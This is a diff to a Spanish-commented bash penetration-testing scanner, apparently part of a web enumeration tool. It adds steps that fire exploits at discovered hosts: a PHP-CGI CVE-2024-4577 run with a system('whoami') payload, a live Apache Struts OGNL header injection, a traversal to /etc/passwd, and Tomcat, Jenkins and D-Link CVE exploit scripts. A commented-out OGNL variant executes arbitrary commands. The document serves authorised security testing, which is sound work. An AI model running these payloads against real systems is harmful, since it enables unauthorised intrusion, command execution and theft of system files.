@@ -759,6 +759,12 @@ function enumeracionApache() {
 		param_msg_error=""
 	fi
 
+	egrep -i 'win' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt 
+	greprc=$?
+	if [[ $greprc -eq 0  ]];then # si el banner es Apache y no se enumero antes		
+		PHP-CGI-cve-2024-4577.py --target "$proto_http://${host}_${port}_${path_web_sin_slash}" -c "<?php system('whoami')?>" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"PHP~CGI~cve~2024~4577.txt 2>&1 &
+	fi
+	 
 
     #1: si no existe log
     if [[ ! -e "logs/vulnerabilidades/${host}_${port}_${path_web_sin_slash}apacheNuclei.txt" ]]; then
@@ -972,7 +978,13 @@ function enumeracionTomcat() {
         echo $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CGIServlet.txt
         eval $command >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CGIServlet.txt &
 
+		#apacheStruts
     	curl -k --max-time 10 -H "Content-Type: %{(#test='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(#ros.println('Apache Struts Vulnerable $proto_http://$host:$port')).(#ros.flush())}" "$proto_http"://"$host":"$port""$path_web" >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"apacheStruts.txt 2>/dev/null&
+
+		##CVE-2024-38819 traversal
+		curl -k "$proto_http"://"$host":"$port""$path_web"static/link/%2e%2e/etc/passwd >> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~38819.txt 2>/dev/null&
+
+		tomcat-cve-2025-24813.py "$proto_http"://"$host":"$port""$path_web"  > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"cve~2025~24813.txt 
 
 		# curl -i -s -k  -X $'GET' -H $'User-Agent: Mozilla/5.0' -H $'Content-Type: %{(#_=\'multipart/form-data\').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#dm):((#container=#context[\'com.opensymphony.xwork2.ActionContext.container\']).(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=\'ls -lat /\').(#iswin=(@java.lang.System@getProperty(\'os.name\').toLowerCase().contains(\'win\'))).(#cmds=(#iswin?{\'cmd.exe\',\'/c\',#cmd}:{\'/bin/bash\',\'-c\',#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.ServletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}' $'https://target'
         waitWeb 0.3
@@ -1268,6 +1280,9 @@ function enumeracionCMS () {
 
 			echo -e "\t\t[+] nuclei Jenkins ("$proto_http"://"$host":"$port")"
 			nuclei -u "$proto_http"://"$host":"$port""$path_web" -H 'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36' -rate-limit 1 -id /root/.local/nuclei-templates/cves/Jenkins.txt  -no-color  -include-rr -debug > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"JenkinsNuclei.txt 2> logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"JenkinsNuclei.txt &			
+			
+			jenkins-cve-2024-43044.py "${proto_http}://${host}:${port}${path_web}" >  logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~43044.txt &
+			#https://github.com/convisolabs/CVE-2024-43044-jenkins
 		fi
 		########################
 
@@ -1598,15 +1613,7 @@ function enumeracionCMS () {
 		###################################
 
 
-		#######  Jenkins  ######
-		grep -qi "Jenkins" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt
-		greprc=$?
-		if [[ $greprc -eq 0 ]];then
-			echo -e "\t\t[+] Revisando vulnerabilidades de Jenkins  ($host)"
-			jenkins-cve-2024-43044.py "${proto_http}://${host}:${port}${path_web}" >  logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"jenkins~cve~2024~43044.txt
 
-		fi
-		###################################
 
 
 		#######  ZKSoftware  ######
@@ -1642,8 +1649,8 @@ function enumeracionCMS () {
 		greprc=$?
 		if [[ $greprc -eq 0 ]];then
 			echo -e "\t\t[+] Revisando vulnerabilidades de D-Link NAS  ($host)"
-			d-Link-NAS-cve-2024-3273.py -u "${proto_http}://${host}:${port}${path_web}" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"dLinkNAS-cve~2024~3273.txt &
-			
+			dLink-NAS-cve-2024-3273.py -u "${proto_http}://${host}:${port}${path_web}" > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"dLinkNAS-cve~2024~3273.txt &			
+			dlink-cve-2024-10914.sh -u "${proto_http}://${host}:${port}${path_web}" -scan > logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"dLinkNAS-cve~2024~10914.txt &		
 		fi
 
 		#######  zimbra  ######
@@ -2444,6 +2451,10 @@ if [[ $webScaneado -eq 1 ]]; then
 			[ ! -e ".enumeracion2/${host}_${port}_certsrv.txt" ] && grep --color=never "401" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"certsrv.txt > .enumeracion/"$host"_"$port"_certsrv.txt 2>/dev/null
 			[ ! -e ".enumeracion2/${host}_${port}_hadoopNamenode.txt" ] && grep --color=never "|" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"hadoopNamenode.txt 2>/dev/null | egrep -iv "ACCESS_DENIED|false|Could|ERROR|NOT_FOUND|DISABLED|filtered|Failed|TIMEOUT|NT_STATUS_INVALID_NETWORK_RESPONSE|NT_STATUS_UNKNOWN|http-server-header|did not respond with any data|http-server-header" > .enumeracion/"$host"_"$port"_hadoopNamenode.txt
 			[ ! -e ".enumeracion2/"$host"_"$port"_webData.txt" ] && grep -v 'Error1 Get' logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"webDataInfo.txt > .enumeracion/"$host"_"$port"_webData.txt 2>/dev/null			
+			[ ! -e ".enumeracion2/"$host"_"$port"_files.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"aspx-files.txt >> .enumeracion/"$host"_"$port"_files.txt 2>/dev/null
+			[ ! -e ".enumeracion2/"$host"_"$port"_files.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"php-files.txt >> .enumeracion/"$host"_"$port"_files.txt 2>/dev/null
+			[ ! -e ".enumeracion2/"$host"_"$port"_files.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"jsp-files.txt >> .enumeracion/"$host"_"$port"_files.txt 2>/dev/null
+			
 			[ ! -e ".vulnerabilidades2/${host}_${port}_divulgacionInformacion.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"divulgacionInformacion.txt >> .vulnerabilidades/"$host"_"$port"_divulgacionInformacion.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/"$host"_"$port"_"$path_web_sin_slash"debugHabilitado.txt" ] && egrep 'framework|home' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"debugHabilitado.txt > .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"debugHabilitado.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/"$host"_"$port"_"$path_web_sin_slash"geoserver~cve~2024~36401.txt" ] && grep -i 'vulnerable' logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"geoserver~cve~2024~36401.txt > .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"geoserver~cve~2024~36401.txt 2>/dev/null
@@ -2456,12 +2467,11 @@ if [[ $webScaneado -eq 1 ]]; then
 			[ ! -e ".vulnerabilidades2/${host}_${port}_openWebservice.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"openWebservice.txt >> .vulnerabilidades/"$host"_"$port"_openWebservice.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/${host}_${port}_webshell.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webshell.txt >> .vulnerabilidades/"$host"_"$port"_webshell.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/"$host"_"$port"_configApache.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"configApache.txt >> .vulnerabilidades/"$host"_"$port"_configApache.txt 2>/dev/null
-			
-			[ ! -e ".vulnerabilidades2/"$host"_"$port"_configIIS.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"configIIS.txt >> .vulnerabilidades/"$host"_"$port"_configIIS.txt 2>/dev/null
-			[ ! -e ".enumeracion2/"$host"_"$port"_files.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"aspx-files.txt >> .enumeracion/"$host"_"$port"_files.txt 2>/dev/null
-			[ ! -e ".enumeracion2/"$host"_"$port"_files.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"php-files.txt >> .enumeracion/"$host"_"$port"_files.txt 2>/dev/null
-			[ ! -e ".enumeracion2/"$host"_"$port"_files.txt" ] && egrep --color=never "^200" logs/enumeracion/"$host"_"$port"_"$path_web_sin_slash"jsp-files.txt >> .enumeracion/"$host"_"$port"_files.txt 2>/dev/null
-			
+			[ ! -e ".vulnerabilidades2/"$host"_"$port"_"$path_web_sin_slash"PHP~CGI~cve~2024~4577.txt" ] && grep -i successful logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"PHP~CGI~cve~2024~4577.txt >> .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"PHP~CGI~cve~2024~4577.txt 2>/dev/null
+			[ ! -e ".vulnerabilidades2/"$host"_"$port"_"$path_web_sin_slash"dLinkNAS-cve~2024~10914.txt" ] && grep -i  vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"dLinkNAS-cve~2024~10914.txt >> .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"dLinkNAS-cve~2024~10914.txt 2>/dev/null
+			[ ! -e ".vulnerabilidades2/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~38819.txt" ] && grep -i  root logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~38819.txt >> .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"CVE~2024~38819.txt 2>/dev/null
+			[ ! -e ".vulnerabilidades2/"$host"_"$port"_"$path_web_sin_slash"cve~2025~24813.txt" ] && grep -i  vulnerable logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"cve~2025~24813.txt >> .vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"cve~2025~24813.txt 2>/dev/null
+			[ ! -e ".vulnerabilidades2/"$host"_"$port"_configIIS.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"configIIS.txt >> .vulnerabilidades/"$host"_"$port"_configIIS.txt 2>/dev/null			
 			[ ! -e ".vulnerabilidades2/${host}_${port}_webarchivos.txt" ] && egrep --color=never "^200" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"webarchivos.txt >> .vulnerabilidades/"$host"_"$port"_webarchivos.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/"$host"_"$port"_vCenter~cve~2021~21972.txt" ] && egrep --color=never -i "vulnerable" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"vCenter~cve~2021~21972.txt >> .vulnerabilidades/"$host"_"$port"_vCenter~cve~2021~21972.txt 2>/dev/null
 			[ ! -e ".vulnerabilidades2/"$host"_"$port"_jboss~cve~2017~12149.txt" ] && egrep --color=never "vulnerable" logs/vulnerabilidades/"$host"_"$port"_"$path_web_sin_slash"jboss~cve~2017~12149.txt >> .vulnerabilidades/"$host"_"$port"_jboss~cve~2017~12149.txt 2>/dev/null
